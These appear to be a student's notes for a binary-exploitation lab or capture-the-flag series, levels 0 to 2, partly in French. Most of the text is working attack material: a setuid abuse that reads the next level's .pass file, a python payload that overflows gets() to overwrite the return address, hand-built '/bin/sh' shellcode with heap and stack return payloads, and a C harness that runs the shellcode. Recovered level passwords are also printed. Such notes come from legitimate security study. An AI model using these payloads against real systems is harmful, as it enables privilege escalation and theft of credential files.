level0:
	
	cmd: "ls -la at 'home/user/level0'"
	see 'level0' owned by level1
	
	Decompile executable '/home/user/level0/level0'
	see condition that blocks if input is different than "423"
	then it executes an execv command with the rights of the executable owner so 'level01'
	
	cmd: "./level0 423"
	cmd: >"cat /home/user/level1/.pass"
	
	pass:  "1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a"

level1:
	
	gdb mettre breakpoint dans gets
	
	cmd: "(python -c "print('T'*76 + '\x44\x84\x04\x08')" ; echo 'cat /home/user/level2/.pass') | ./level1"
	
	pass: "53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77"
	
	0xbffff6f0	addresse du debut de la memoire des variables locales
	0xbffff6dc addresse de stockage de l'address de retour du get
	
	3221223152 - 3221223132 = 20
	
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

\xb8 \x44\x84\x04\x08

0x08048444
\x44\x84\x04\x08
0xbf ff f6 e0
\x0e\xf6\xff\xbf

00000000 <.text>:
   0:	b8 44 84 04 08			mov    $0x8048444,%eax
   5:	ff e0							jmp    *%eax

\xb8\x44\x84\x04\x08\xff\xe0

p/x *(unsigned long*)$ebp

p/x *(unsigned long long*)$esp

0x080491a0


level2:

	<p> retour vers heap (address statique) premier opcode jump vers le tableau dans la stack
	en plus du nombre d'octets pour atteindre la premiere vrai instruction de notre fonction

	cmd: "cat /home/user/level3/.pass"

esp				= 0xbffff6c0

suppose addr	=  0x80484f2


\x55\x89\xe5\x83\xec\x28\x65\xa1\x14\x00\x00\x00\x89\x45\xf4\x31\xc0\xc7\x45\xec\x2f\x62\x69\x6e\xc7\x45\xf0\x2f\x73\x68\x00\x8d\x45\xec\x89\x04\x24\xe8\xf2\xfe\xff\xff\x8b\x45\xf4\x65\x33\x05\x14\x00\x00\x00\x74\x05\xe8\xd1\xfe\xff\xff\xc9\xc3\x55\x89\xe5


[HEAP ADDRESS]
0x804a008

CMD [MAIN>P>HEAP]:
python -c "print('\x55\x89\xe5\x83\xec\x28\x65\xa1\x14\x00\x00\x00\x89\x45\xf4\x31\xc0\xc7\x45\xec\x2f\x62\x69\x6e\xc7\x45\xf0\x2f\x73\x68\x00\x8d\x45\xec\x89\x04\x24\xe8\xf2\xfe\xff\xff\x8b\x45\xf4\x65\x33\x05\x14\x00\x00\x00\x74\x05\xe8\xd1\xfe\xff\xff\xc9\xc3\x55\x89\xe5' + 'A'*16 + '\x08\xa0\x04\x08')" | ./level2

CMD [MAIN>P>MAIN>TAB]:
python -c "print('\xe0\xf6\xff\xbf\x55\x89\xe5\x83\xec\x28\x65\xa1\x14\x00\x00\x00\x89\x45\xf4\x31\xc0\xc7\x45\xec\x2f\x62\x69\x6e\xc7\x45\xf0\x2f\x73\x68\x00\x8d\x45\xec\x89\x04\x24\xe8\xf2\xfe\xff\xff\x8b\x45\xf4\x65\x33\x05\x14\x00\x00\x00\x74\x05\xe8\xd1\xfe\xff\xff\xc9' + 'A'*16 + '\x4a\x85\x04\x08')" | ./level2


CODE C:
	typedef int (*callback)();

	int main()
	{
	        char tab[] = "\x55\x89\xe5\x83\xec\x28\x65\xa1\x14\x00\x00\x00\x89\x45\xf4\x31\xc0\xc$

	        callback HEHE = (callback)&tab;

	        HEHE();
	};


